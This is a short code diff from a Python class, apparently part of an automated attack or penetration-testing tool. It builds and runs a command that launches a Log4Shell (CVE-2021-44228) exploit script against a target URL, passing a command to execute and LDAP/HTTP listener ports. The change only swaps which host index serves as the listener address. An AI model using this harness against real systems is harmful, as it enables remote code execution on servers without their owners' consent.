@@ -363,7 +363,7 @@ class Trainman:
         os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
         env.update(os.environ)
         exploit_cve_2021_44228_cmd = \
-            f'python3 main.py -i {self.host_info[2]} -u {target_url} -c {exec_cmd} -p {http_port} -l {ldap_port}'
+            f'python3 main.py -i {self.host_info[0]} -u {target_url} -c {exec_cmd} -p {http_port} -l {ldap_port}'
         exploit_cve_2021_44228 = subprocess.Popen(
             exploit_cve_2021_44228_cmd,
             stdin=subprocess.PIPE,
